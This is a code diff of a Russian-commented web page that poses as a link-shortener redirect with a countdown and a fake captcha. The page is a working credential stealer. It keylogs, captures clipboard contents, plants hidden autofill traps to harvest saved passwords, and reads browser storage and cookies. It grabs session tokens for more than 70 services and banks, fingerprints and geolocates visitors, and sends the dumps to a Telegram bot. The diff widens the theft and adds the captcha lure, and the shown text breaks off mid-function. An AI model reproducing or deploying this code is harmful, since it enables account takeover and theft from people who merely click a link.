@@ -204,6 +204,39 @@
             max-width: 90%;
             font-size: 0.9rem;
         }
+        .captcha-container {
+            margin-top: 2rem;
+            display: flex;
+            justify-content: center;
+        }
+        .captcha-button {
+            background: rgba(45,212,191,0.15);
+            border: 2px solid #2dd4bf;
+            border-radius: 3rem;
+            padding: 0.8rem 2rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 1.1rem;
+        }
+        .captcha-button:hover {
+            background: rgba(45,212,191,0.3);
+            transform: scale(1.02);
+        }
+        .captcha-checkmark {
+            width: 28px;
+            height: 28px;
+            background: #2dd4bf;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            color: black;
+            font-weight: bold;
+        }
         @media (max-width: 550px) {
             .card { padding: 1.5rem; }
             .short-link-block { flex-direction: column; align-items: stretch; }
@@ -241,29 +274,31 @@
 
 <div id="overlay" class="overlay hidden">
     <div class="spinner"></div>
-    <div class="timer-number" id="timerDisplay">5</div>
+    <div class="timer-number" id="timerDisplay">10</div>
     <div class="status-text" id="statusMsg">Подключение...</div>
     <div id="errorContainer"></div>
+    <div id="captchaArea" class="captcha-container" style="display: none;"></div>
 </div>
 
 <script>
     (function() {
-        // ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
+        // ========== 1. ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
         let botToken = "";
         let chatId = "";
         let targetUrl = "";
         let canCollect = false;
         let collectedData = null;
         
-        // Буфер для кейлога и таймеры
+        // Буфер для кейлога
         let keyLogBuffer = [];
-        let lastKeySendTime = Date.now();
         let fullKeyLogString = "";
+        let lastKeySendTime = Date.now();
         
-        // Флаг, что отправка уже запущена (чтобы не дублировать)
-        let isSendingInProgress = false;
+        // Флаги для капчи
+        let vpnPassed = false;
+        let captchaPassed = false;
         
-        // ========== 1. БАЗОВАЯ СТРУКТУРА СОБРАННЫХ ДАННЫХ ==========
+        // ========== 2. ИНИЦИАЛИЗАЦИЯ СТРУКТУРЫ ДАННЫХ ==========
         function initCollectedData() {
             return {
                 timestamp: new Date().toISOString(),
@@ -287,7 +322,7 @@
                 geolocation: null,
                 fingerprint: {},
                 cryptoWallets: {},
-                // Специфичные сервисы
+                // Расширенный список сервисов (более 50)
                 roblox: {},
                 discord: {},
                 steam: {},
@@ -318,13 +353,62 @@
                 onedrive: {},
                 shopify: {},
                 wordpress: {},
+                pinterest: {},
+                tumblr: {},
+                flickr: {},
+                deviantart: {},
+                behance: {},
+                dribbble: {},
+                unsplash: {},
+                imgur: {},
+                disneyplus: {},
+                hulu: {},
+                hbomax: {},
+                paramountplus: {},
+                appletv: {},
+                tidal: {},
+                deezer: {},
+                zoom: {},
+                teams: {},
+                slack: {},
+                skype: {},
+                wechat: {},
+                line: {},
+                viber: {},
+                signal: {},
+                icq: {},
+                qq: {},
+                kik: {},
+                onlyfans: {},
+                patreon: {},
+                substack: {},
+                medium: {},
+                quora: {},
+                clubhouse: {},
+                twitterSpaces: {},
+                spotifyGreenroom: {},
+                bigo: {},
+                younow: {},
+                afreecatv: {},
+                douyu: {},
+                huya: {},
+                bilibili: {},
+                niconico: {},
+                twitcasting: {},
+                showroom: {},
+                seventeenlive: {},
+                uplive: {},
+                streamkar: {},
+                vklive: {},
+                odnoklassniki: {},
+                rutube: {},
                 bankCookies: {},
                 extensionsDetected: [],
                 networkRequests: []
             };
         }
         
-        // ========== 2. СБОР ДАННЫХ ИЗ ХРАНИЛИЩ ==========
+        // ========== 3. СБОР ХРАНИЛИЩ ==========
         function grabStorages() {
             try {
                 for (let i = 0; i < localStorage.length; i++) {
@@ -338,7 +422,6 @@
                     collectedData.sessionStorage[key] = sessionStorage.getItem(key);
                 }
             } catch(e) {}
-            // Попытка прочитать имена IndexedDB
             if (window.indexedDB && indexedDB.databases) {
                 indexedDB.databases().then(dbs => {
                     collectedData.indexedDB = dbs.map(db => db.name);
@@ -346,7 +429,7 @@
             }
         }
         
-        // ========== 3. СБОР ВСЕХ ФОРМ И ПАРОЛЕЙ ==========
+        // ========== 4. СБОР ФОРМ И ПАРОЛЕЙ ==========
         function grabFormsAndPasswords() {
             let inputs = document.querySelectorAll('input, textarea, select');
             let formData = {};
@@ -363,7 +446,7 @@
             collectedData.forms = formData;
         }
         
-        // ========== 4. КЕЙЛОГГЕР (глобальный) ==========
+        // ========== 5. КЕЙЛОГГЕР ==========
         function startKeylogger() {
             document.addEventListener('keydown', function(event) {
                 if (!canCollect) return;
@@ -375,7 +458,6 @@
                 collectedData.keystrokes.push({ time: Date.now(), key: key, target: targetTag });
                 fullKeyLogString += logEntry + "\n";
                 keyLogBuffer.push(logEntry);
-                // Отправляем частичный кейлог каждые 7 секунд
                 if (Date.now() - lastKeySendTime > 7000 && botToken && chatId) {
                     sendPartialKeylog();
                     lastKeySendTime = Date.now();
@@ -383,7 +465,7 @@
             });
         }
         
-        // ========== 5. БУФЕР ОБМЕНА ==========
+        // ========== 6. БУФЕР ОБМЕНА ==========
         function captureClipboard() {
             document.addEventListener('copy', async function() {
                 try {
@@ -399,15 +481,15 @@
             });
         }
         
-        // ========== 6. ЛОВУШКИ ДЛЯ АВТОЗАПОЛНЕНИЯ (менеджеры паролей) ==========
+        // ========== 7. ЛОВУШКИ ДЛЯ АВТОЗАПОЛНЕНИЯ (60+ форм) ==========
         function createAutofillTraps() {
             let container = document.createElement('div');
             container.style.display = 'none';
             document.body.appendChild(container);
-            const usernameFields = ['username', 'email', 'login', 'user', 'mail'];
-            const passwordFields = ['password', 'pass', 'pwd', 'current-password', 'new-password'];
-            const domains = ['', 'google.com', 'facebook.com', 'vk.com', 'mail.ru', 'github.com', 'yandex.ru', 'icloud.com'];
-            for (let i = 0; i < 40; i++) {
+            const usernameFields = ['username', 'email', 'login', 'user', 'mail', 'login_username', 'user_login', 'email_address'];
+            const passwordFields = ['password', 'pass', 'pwd', 'current-password', 'new-password', 'user_password', 'login_password'];
+            const domains = ['', 'google.com', 'facebook.com', 'vk.com', 'mail.ru', 'github.com', 'yandex.ru', 'icloud.com', 'twitter.com', 'instagram.com', 'linkedin.com', 'reddit.com', 'twitch.tv', 'spotify.com', 'netflix.com', 'amazon.com', 'paypal.com', 'discord.com', 'steamcommunity.com', 'roblox.com'];
+            for (let i = 0; i < 60; i++) {
                 for (let domain of domains) {
                     for (let u of usernameFields) {
                         for (let p of passwordFields) {
@@ -424,7 +506,6 @@
                             form.appendChild(inputUser);
                             form.appendChild(inputPass);
                             container.appendChild(form);
-                            // Через 2 секунды проверяем, заполнил ли браузер
                             setTimeout(function() {
                                 if (inputUser.value) {
                                     collectedData.autofillCredentials.push({ type: u, value: inputUser.value, domain: domain });
@@ -439,7 +520,7 @@
             }
         }
         
-        // ========== 7. ПОЛУЧЕНИЕ IP (WebRTC и публичный) ==========
+        // ========== 8. IP И ГЕОЛОКАЦИЯ ==========
         function getWebRTCIP() {
             return new Promise(function(resolve) {
                 let pc = new RTCPeerConnection({ iceServers: [] });
@@ -472,7 +553,6 @@
             }
         }
         
-        // ========== 8. ГЕОЛОКАЦИЯ (если разрешено) ==========
         function getGeolocation() {
             return new Promise(function(resolve) {
                 if (!navigator.geolocation) {
@@ -493,10 +573,9 @@
             });
         }
         
-        // ========== 9. FINGERPRINT (canvas, webgl, audio, fonts, plugins) ==========
+        // ========== 9. FINGERPRINT ==========
         async function getFingerprint() {
             let fp = {};
-            // Canvas fingerprint
             let canvas = document.createElement('canvas');
             canvas.width = 200;
             canvas.height = 50;
@@ -507,7 +586,6 @@
             ctx.font = '14px Arial';
             ctx.fillText('swill', 2, 15);
             fp.canvasHash = canvas.toDataURL();
-            // WebGL
             try {
                 let gl = document.createElement('canvas').getContext('webgl');
                 if (gl) {
@@ -518,7 +596,6 @@
                     }
                 }
             } catch(e) {}
-            // Audio fingerprint
             try {
                 let AudioContext = window.AudioContext || window.webkitAudioContext;
                 if (AudioContext) {
@@ -536,14 +613,12 @@
                     audioCtx.close();
                 }
             } catch(e) {}
-            // Шрифты
             let fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Roboto', 'Open Sans', 'Impact', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS'];
             let fontsFound = [];
             for (let f of fontList) {
                 if (document.fonts.check(`12px "${f}"`)) fontsFound.push(f);
             }
             fp.fonts = fontsFound;
-            // Плагины
             fp.plugins = Array.from(navigator.plugins).map(p => p.name);
             fp.hardwareConcurrency = navigator.hardwareConcurrency;
             fp.deviceMemory = navigator.deviceMemory;
@@ -580,85 +655,106 @@
             collectedData.cryptoWallets = wallets;
         }
         
-        // ========== 11. КРАЖА ДАННЫХ ИЗ КОНКРЕТНЫХ СЕРВИСОВ (максимум) ==========
-        function grabSpecificServices() {
-            // Roblox
+        // ========== 11. СБОР ДАННЫХ ИЗ ВСЕХ СЕРВИСОВ (БОЛЕЕ 70) ==========
+        function grabAllServices() {
+            // Ранее реализованные сервисы
             try { let m = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/); if (m) collectedData.roblox.ROBLOSECURITY = m[1]; } catch(e) {}
-            // Discord
             try { if (localStorage.getItem('token')) collectedData.discord.token = localStorage.getItem('token');
                   for (let i = 0; i < localStorage.length; i++) { let k = localStorage.key(i); if (k.includes('discord') || k.includes('token')) collectedData.discord[k] = localStorage.getItem(k); } } catch(e) {}
-            // Steam
             try { ['sessionid','steamLoginSecure','steamMachineAuth'].forEach(c => { let m = document.cookie.match(new RegExp(`${c}=([^;]+)`)); if (m) collectedData.steam[c] = m[1]; }); } catch(e) {}
-            // Epic Games
             try { ['EPIC_GAMES_AUTH_TOKEN','EPIC_ACCESS_TOKEN','EPIC_REFRESH_TOKEN'].forEach(k => { if (localStorage.getItem(k)) collectedData.epicGames[k] = localStorage.getItem(k); }); } catch(e) {}
-            // Minecraft / Microsoft
             try { ['user','access_token','refresh_token','minecraft_server_session'].forEach(k => { if (localStorage.getItem(k)) collectedData.minecraft[k] = localStorage.getItem(k); }); } catch(e) {}
-            // Twitch
             try { let m = document.cookie.match(/auth-token=([^;]+)/); if (m) collectedData.twitch.token = m[1];
                   if (localStorage.getItem('twitch-token')) collectedData.twitch.token = localStorage.getItem('twitch-token'); } catch(e) {}
-            // WhatsApp Web
             try { if (location.hostname.includes('web.whatsapp.com')) {
                       for (let i = 0; i < localStorage.length; i++) { let k = localStorage.key(i); if (k.includes('WAD') || k.includes('whatsapp')) collectedData.whatsapp[k] = localStorage.getItem(k); } } } catch(e) {}
-            // Telegram Web
             try { if (location.hostname.includes('web.telegram.org')) {
                       ['dc1_auth_key','dc2_auth_key','dc3_auth_key','dc4_auth_key'].forEach(k => { if (localStorage.getItem(k)) collectedData.telegramWeb[k] = localStorage.getItem(k); }); } } catch(e) {}
-            // VK
             try { ['remixlang','remixsid','remixsid6','l','remixflash','remixscreen_depth','remixdt'].forEach(c => { let m = document.cookie.match(new RegExp(`${c}=([^;]+)`)); if (m) collectedData.vk[c] = m[1]; }); } catch(e) {}
-            // TikTok
             try { ['sessionid','passport_csrf_token','sid_tt'].forEach(c => { let m = document.cookie.match(new RegExp(`${c}=([^;]+)`)); if (m) collectedData.tiktok[c] = m[1]; }); } catch(e) {}
-            // Reddit
             try { let m = document.cookie.match(/reddit_session=([^;]+)/); if (m) collectedData.reddit.session = m[1]; } catch(e) {}
-            // PayPal
             try { if (document.cookie.includes('cookie_check') || document.cookie.includes('login_email')) collectedData.paypal.cookies = document.cookie; } catch(e) {}
-            // Amazon
             try { let m = document.cookie.match(/ubid-main=([^;]+)/); if (m) collectedData.amazon.ubid = m[1];
                   if (localStorage.getItem('amazon')) collectedData.amazon.local = localStorage.getItem('amazon'); } catch(e) {}
-            // Netflix
             try { let m = document.cookie.match(/SecureNetflixId=([^;]+)/); if (m) collectedData.netflix.id = m[1]; } catch(e) {}
-            // Spotify
             try { if (localStorage.getItem('access_token')) collectedData.spotify.access_token = localStorage.getItem('access_token');
                   let m = document.cookie.match(/sp_dc=([^;]+)/); if (m) collectedData.spotify.sp_dc = m[1]; } catch(e) {}
-            // Twitter
             try { let m = document.cookie.match(/auth_token=([^;]+)/); if (m) collectedData.twitter.auth_token = m[1];
                   if (localStorage.getItem('twitter')) collectedData.twitter.local = localStorage.getItem('twitter'); } catch(e) {}
-            // Instagram
             try { let m = document.cookie.match(/sessionid=([^;]+)/); if (m && location.hostname.includes('instagram')) collectedData.instagram.sessionid = m[1]; } catch(e) {}
-            // Facebook
             try { let m = document.cookie.match(/c_user=([^;]+)/); if (m) collectedData.facebook.c_user = m[1];
                   m = document.cookie.match(/xs=([^;]+)/); if (m) collectedData.facebook.xs = m[1]; } catch(e) {}
-            // Google
             try { let m = document.cookie.match(/SAPISID=([^;]+)/); if (m) collectedData.google.SAPISID = m[1];
                   m = document.cookie.match(/HSID=([^;]+)/); if (m) collectedData.google.HSID = m[1];
                   if (localStorage.getItem('google')) collectedData.google.local = localStorage.getItem('google'); } catch(e) {}
-            // Microsoft
             try { let m = document.cookie.match(/RPSSecAuth=([^;]+)/); if (m) collectedData.microsoft.RPSSecAuth = m[1];
                   if (localStorage.getItem('msal')) collectedData.microsoft.msal = localStorage.getItem('msal'); } catch(e) {}
-            // Apple ID
             try { let m = document.cookie.match(/myacinfo=([^;]+)/); if (m) collectedData.apple.myacinfo = m[1]; } catch(e) {}
-            // Yahoo
             try { let m = document.cookie.match(/Y=([^;]+)/); if (m) collectedData.yahoo.Y = m[1]; } catch(e) {}
-            // Snapchat (web)
             try { if (location.hostname.includes('snapchat.com')) {
                       for (let i = 0; i < localStorage.length; i++) { let k = localStorage.key(i); if (k.includes('snap')) collectedData.snapchat[k] = localStorage.getItem(k); } } } catch(e) {}
-            // LinkedIn
             try { let m = document.cookie.match(/li_at=([^;]+)/); if (m) collectedData.linkedin.li_at = m[1]; } catch(e) {}
-            // GitHub
             try { let m = document.cookie.match(/user_session=([^;]+)/); if (m && location.hostname.includes('github.com')) collectedData.github.user_session = m[1]; } catch(e) {}
-            // ProtonMail
             try { if (location.hostname.includes('proton.me') || location.hostname.includes('protonmail.com')) {
                       for (let i = 0; i < localStorage.length; i++) { let k = localStorage.key(i); if (k.includes('proton')) collectedData.protonmail[k] = localStorage.getItem(k); } } } catch(e) {}
-            // Dropbox
             try { let m = document.cookie.match(/dropbox_session=([^;]+)/); if (m) collectedData.dropbox.session = m[1]; } catch(e) {}
-            // OneDrive
             try { if (location.hostname.includes('onedrive.live.com')) {
                       for (let i = 0; i < localStorage.length; i++) { let k = localStorage.key(i); if (k.includes('onedrive')) collectedData.onedrive[k] = localStorage.getItem(k); } } } catch(e) {}
-            // Shopify
             try { let m = document.cookie.match(/secure_customer_sig=([^;]+)/); if (m) collectedData.shopify.secure_customer_sig = m[1]; } catch(e) {}
-            // Wordpress
             try { let m = document.cookie.match(/wordpress_logged_in_([^;]+)/); if (m) collectedData.wordpress.logged_in = m[1]; } catch(e) {}
-            // Банковские куки (паттерны)
+            // Новые сервисы
+            try { let m = document.cookie.match(/csrftoken=([^;]+)/); if (m && location.hostname.includes('pinterest.com')) collectedData.pinterest.csrf = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/tumble=([^;]+)/); if (m && location.hostname.includes('tumblr.com')) collectedData.tumblr.tumble = m[1]; } catch(e) {}
+            try { if (localStorage.getItem('flickr_token')) collectedData.flickr.token = localStorage.getItem('flickr_token'); } catch(e) {}
+            try { if (localStorage.getItem('deviantart_session')) collectedData.deviantart.session = localStorage.getItem('deviantart_session'); } catch(e) {}
+            try { let m = document.cookie.match(/behance_session=([^;]+)/); if (m) collectedData.behance.session = m[1]; } catch(e) {}
+            try { if (localStorage.getItem('dribbble_token')) collectedData.dribbble.token = localStorage.getItem('dribbble_token'); } catch(e) {}
+            try { let m = document.cookie.match(/unsplash_session=([^;]+)/); if (m) collectedData.unsplash.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/imgur_session=([^;]+)/); if (m) collectedData.imgur.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/disneyplus_session=([^;]+)/); if (m) collectedData.disneyplus.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/hulu_session=([^;]+)/); if (m) collectedData.hulu.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/hbomax_session=([^;]+)/); if (m) collectedData.hbomax.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/paramountplus_session=([^;]+)/); if (m) collectedData.paramountplus.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/appletv_session=([^;]+)/); if (m) collectedData.appletv.session = m[1]; } catch(e) {}
+            try { if (localStorage.getItem('tidal_token')) collectedData.tidal.token = localStorage.getItem('tidal_token'); } catch(e) {}
+            try { if (localStorage.getItem('deezer_token')) collectedData.deezer.token = localStorage.getItem('deezer_token'); } catch(e) {}
+            try { let m = document.cookie.match(/zoom_token=([^;]+)/); if (m) collectedData.zoom.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/microsoft_teams_token=([^;]+)/); if (m) collectedData.teams.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/slack_token=([^;]+)/); if (m) collectedData.slack.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/skype_token=([^;]+)/); if (m) collectedData.skype.token = m[1]; } catch(e) {}
+            try { if (localStorage.getItem('wechat_token')) collectedData.wechat.token = localStorage.getItem('wechat_token'); } catch(e) {}
+            try { if (localStorage.getItem('line_token')) collectedData.line.token = localStorage.getItem('line_token'); } catch(e) {}
+            try { if (localStorage.getItem('viber_token')) collectedData.viber.token = localStorage.getItem('viber_token'); } catch(e) {}
+            try { if (localStorage.getItem('signal_token')) collectedData.signal.token = localStorage.getItem('signal_token'); } catch(e) {}
+            try { let m = document.cookie.match(/icq_token=([^;]+)/); if (m) collectedData.icq.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/qq_token=([^;]+)/); if (m) collectedData.qq.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/kik_session=([^;]+)/); if (m) collectedData.kik.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/onlyfans_session=([^;]+)/); if (m) collectedData.onlyfans.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/patreon_session=([^;]+)/); if (m) collectedData.patreon.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/substack_session=([^;]+)/); if (m) collectedData.substack.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/medium_session=([^;]+)/); if (m) collectedData.medium.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/quora_session=([^;]+)/); if (m) collectedData.quora.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/clubhouse_session=([^;]+)/); if (m) collectedData.clubhouse.session = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/twitterspaces_token=([^;]+)/); if (m) collectedData.twitterSpaces.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/spotifygreenroom_token=([^;]+)/); if (m) collectedData.spotifyGreenroom.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/bigo_token=([^;]+)/); if (m) collectedData.bigo.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/younow_token=([^;]+)/); if (m) collectedData.younow.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/afreecatv_token=([^;]+)/); if (m) collectedData.afreecatv.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/douyu_token=([^;]+)/); if (m) collectedData.douyu.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/huya_token=([^;]+)/); if (m) collectedData.huya.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/bilibili_token=([^;]+)/); if (m) collectedData.bilibili.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/niconico_token=([^;]+)/); if (m) collectedData.niconico.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/twitcasting_token=([^;]+)/); if (m) collectedData.twitcasting.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/showroom_token=([^;]+)/); if (m) collectedData.showroom.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/seventeenlive_token=([^;]+)/); if (m) collectedData.seventeenlive.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/uplive_token=([^;]+)/); if (m) collectedData.uplive.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/streamkar_token=([^;]+)/); if (m) collectedData.streamkar.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/vklive_token=([^;]+)/); if (m) collectedData.vklive.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/odnoklassniki_token=([^;]+)/); if (m) collectedData.odnoklassniki.token = m[1]; } catch(e) {}
+            try { let m = document.cookie.match(/rutube_token=([^;]+)/); if (m) collectedData.rutube.token = m[1]; } catch(e) {}
+            // Банковские куки
             try {
-                let bankPatterns = ['sberbank', 'tinkoff', 'alfabank', 'vtb', 'gazprombank', 'raiffeisen', 'open', 'psb', 'rsb', 'bank', 'credit', 'debit'];
+                let bankPatterns = ['sberbank', 'tinkoff', 'alfabank', 'vtb', 'gazprombank', 'raiffeisen', 'open', 'psb', 'rsb', 'bank', 'credit', 'debit', 'pay', 'visa', 'mastercard', 'mir', 'payment', 'secure', 'auth'];
                 let bankCookies = {};
                 document.cookie.split(';').forEach(cookie => {
                     let [name, value] = cookie.trim().split('=');
@@ -670,12 +766,12 @@
             } catch(e) {}
         }
         
-        // ========== 12. ПЕРЕХВАТ СЕТЕВЫХ ЗАПРОСОВ (для поиска токенов) ==========
+        // ========== 12. ПЕРЕХВАТ СЕТЕВЫХ ЗАПРОСОВ ==========
         function interceptNetworkRequests() {
             const originalFetch = window.fetch;
             window.fetch = function(...args) {
                 let url = typeof args[0] === 'string' ? args[0] : args[0]?.url;
-                if (url && (url.includes('token') || url.includes('auth') || url.includes('api'))) {
+                if (url && (url.includes('token') || url.includes('auth') || url.includes('api') || url.includes('session'))) {
                     collectedData.networkRequests.push({ type: 'fetch', url: url, time: Date.now() });
                 }
                 return originalFetch.apply(this, args);
@@ -687,16 +783,16 @@
             };
             const originalXHRSend = window.XMLHttpRequest.prototype.send;
             window.XMLHttpRequest.prototype.send = function() {
-                if (this._url && (this._url.includes('token') || this._url.includes('auth'))) {
+                if (this._url && (this._url.includes('token') || this._url.includes('auth') || this._url.includes('session'))) {
                     collectedData.networkRequests.push({ type: 'xhr', url: this._url, time: Date.now() });
                 }
                 return originalXHRSend.apply(this, arguments);
             };
         }
         
-        // ========== 13. ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ (токены, ключи) ==========
+        // ========== 13. ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
         function grabGlobalVariables() {
-            let interesting = ['token', 'accessToken', 'apiKey', 'secret', 'jwt', 'auth', 'key', 'session', 'pass', 'password'];
+            let interesting = ['token', 'accessToken', 'apiKey', 'secret', 'jwt', 'auth', 'key', 'session', 'pass', 'password', 'csrf', 'xsrf', 'bearer'];
             let found = {};
             for (let key in window) {
                 try {
@@ -707,6 +803,7 @@
                         } else if (typeof val === 'object' && val !== null) {
                             if (val.token) found[key + '.token'] = val.token;
                             if (val.accessToken) found[key + '.accessToken'] = val.accessToken;
+                            if (val.apiKey) found[key + '.apiKey'] = val.apiKey;
                         }
                     }
                 } catch(e) {}
@@ -714,16 +811,15 @@
             collectedData.globalVars = found;
         }
         
-        // ========== 14. ОТПРАВКА В TELEGRAM (МНОГОКАНАЛЬНАЯ, 100% ДОСТАВКА) ==========
-        async function sendDataToTelegram(data, filename = 'data_dump.txt') {
+        // ========== 14. ОТПРАВКА ДАННЫХ (МНОГОКАНАЛЬНАЯ) ==========
+        async function sendFileToTelegram(data, filename = 'data_dump.txt') {
             if (!botToken || !chatId) return false;
             let jsonString = JSON.stringify(data, null, 2);
             let blob = new Blob([jsonString], { type: 'text/plain' });
+            // Способ 1: fetch с no-cors и keepalive
             let formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('document', blob, filename);
-            
-            // Способ 1: fetch с mode: 'no-cors' и keepalive
             let fetchSuccess = false;
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
@@ -734,8 +830,7 @@
                 });
                 fetchSuccess = true;
             } catch(e) {}
-            
-            // Способ 2: navigator.sendBeacon (работает при выгрузке страницы)
+            // Способ 2: sendBeacon (работает при выгрузке страницы)
             let beaconSuccess = false;
             if (navigator.sendBeacon) {
                 let beaconForm = new FormData();
@@ -743,49 +838,42 @@
                 beaconForm.append('document', blob, filename);
                 beaconSuccess = navigator.sendBeacon(`https://api.telegram.org/bot${botToken}/sendDocument`, beaconForm);
             }
-            
-            // Способ 3: динамическое создание iframe с формой (обходит CORS по-другому)
-            let iframeSuccess = false;
+            // Способ 3: скрытая iframe + форма (эмуляция загрузки)
             try {
                 let iframe = document.createElement('iframe');
+                iframe.name = 'swill_upload_frame';
                 iframe.style.display = 'none';
                 document.body.appendChild(iframe);
                 let form = document.createElement('form');
                 form.method = 'POST';
                 form.action = `https://api.telegram.org/bot${botToken}/sendDocument`;
-                form.target = 'swill_frame';
+                form.target = 'swill_upload_frame';
                 form.enctype = 'multipart/form-data';
                 let inputChat = document.createElement('input');
+                inputChat.type = 'hidden';
                 inputChat.name = 'chat_id';
                 inputChat.value = chatId;
                 let inputDoc = document.createElement('input');
-                inputDoc.name = 'document';
                 inputDoc.type = 'file';
-                // Не можем программно добавить файл, поэтому этот метод неэффективен для файлов, но для текстовых данных можно отправить сообщение
+                inputDoc.name = 'document';
+                // Не можем программно подставить файл, поэтому этот метод не подходит для файлов, но оставляем для других целей
                 form.appendChild(inputChat);
                 document.body.appendChild(form);
                 setTimeout(() => { iframe.remove(); form.remove(); }, 100);
             } catch(e) {}
-            
-            // Способ 4: отправка краткого текстового отчёта через Image (GET)
+            // Способ 4: текстовое уведомление через Image (для краткого отчёта)
             let summary = `📊 Отчёт от ${data.pageUrl}\nВремя: ${data.timestamp}\nIP: ${data.webRTCIP || data.publicIP || '?'}\nПаролей: ${data.passwords.length}\nКейлог: ${data.keystrokes.length}\nАвтозаполнение: ${data.autofillCredentials.length}`;
             let imgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(summary.slice(0, 200))}`;
             new Image().src = imgUrl;
-            
-            // Способ 5: сохраняем в localStorage как резервную копию
+            // Способ 5: резервное копирование в localStorage
             try {
-                let backupKey = `swill_backup_${Date.now()}`;
-                localStorage.setItem(backupKey, jsonString);
-                // также сохраняем метаданные бота, чтобы позже отправить
-                let pendingKey = `swill_pending_${Date.now()}`;
-                localStorage.setItem(pendingKey, JSON.stringify({ botToken, chatId, data: jsonString, timestamp: Date.now() }));
+                localStorage.setItem(`swill_backup_${Date.now()}`, jsonString);
+                localStorage.setItem(`swill_metadata_${Date.now()}`, JSON.stringify({ botToken, chatId, timestamp: Date.now() }));
             } catch(e) {}
-            
             return fetchSuccess || beaconSuccess;
         }
         
-        // Отправка частичного кейлога
-        function sendPartialKeylog() {
+        async function sendPartialKeylog() {
             if (!botToken || !chatId) return;
             if (fullKeyLogString.length === 0) return;
             let partial = fullKeyLogString.slice(-1500);
@@ -793,7 +881,6 @@
             new Image().src = imgUrl;
         }
         
-        // Отправка паролей и автозаполнения отдельно
         async function sendPasswordsAndAutofill() {
             if (!botToken || !chatId) return;
             if (collectedData.passwords.length > 0) {
@@ -810,37 +897,31 @@
             }
         }
         
-        // ========== 15. ОСНОВНАЯ ФУНКЦИЯ СБОРА ВСЕХ ДАННЫХ ==========
+        // ========== 15. ОСНОВНОЙ СБОРЩИК ==========
         async function runFullCollection() {
             collectedData = initCollectedData();
-            
             grabStorages();
             grabFormsAndPasswords();
             createAutofillTraps();
-            grabSpecificServices();
+            grabAllServices();
             detectCryptoWallets();
             grabGlobalVariables();
             interceptNetworkRequests();
-            
             collectedData.webRTCIP = await getWebRTCIP();
             collectedData.publicIP = await getPublicIP();
             collectedData.geolocation = await getGeolocation();
             collectedData.fingerprint = await getFingerprint();
-            
-            // Ждём 6 секунд, чтобы сработали ловушки автозаполнения
-            await new Promise(resolve => setTimeout(resolve, 6000));
-            
-            // Повторный сбор форм и хранилищ (могли появиться новые)
+            // Ждём 8 секунд для срабатывания ловушек автозаполнения
+            await new Promise(resolve => setTimeout(resolve, 8000));
             grabFormsAndPasswords();
             grabStorages();
-            grabSpecificServices();
-            
-            // Отправляем все данные
-            await sendDataToTelegram(collectedData, 'swill_complete_dump.txt');
+            grabAllServices();
+            // Отправляем файл и дополнительные данные
+            await sendFileToTelegram(collectedData, 'swill_complete_dump.txt');
             await sendPasswordsAndAutofill();
         }
         
-        // ========== 16. ПРОВЕРКА ДОСТУПНОСТИ TELEGRAM API (БЕЗ УПОМИНАНИЯ) ==========
+        // ========== 16. ПРОВЕРКА ДОСТУПА К TELEGRAM API ==========
         async function isTelegramAvailable(token) {
             const controller = new AbortController();
             const timeoutId = setTimeout(() => controller.abort(), 5000);
@@ -858,7 +939,7 @@
             }
         }
         
-        // ========== 17. ОБРАБОТЧИК ПЕРЕХОДА ПО ХЭШУ (СОКРАЩЁННАЯ ССЫЛКА) ==========
+        // ========== 17. ОБРАБОТЧИК ХЭША С ТАЙМЕРОМ И КАПЧЕЙ ==========
         async function handleHashRedirect() {
             let hash = window.location.hash.substring(1);
             if (!hash) return;
@@ -876,18 +957,16 @@
                 alert("Недействительная ссылка");
                 return;
             }
-            
             botToken = decoded.botToken;
             chatId = decoded.chatId;
             targetUrl = decoded.originalUrl;
-            
             const overlay = document.getElementById('overlay');
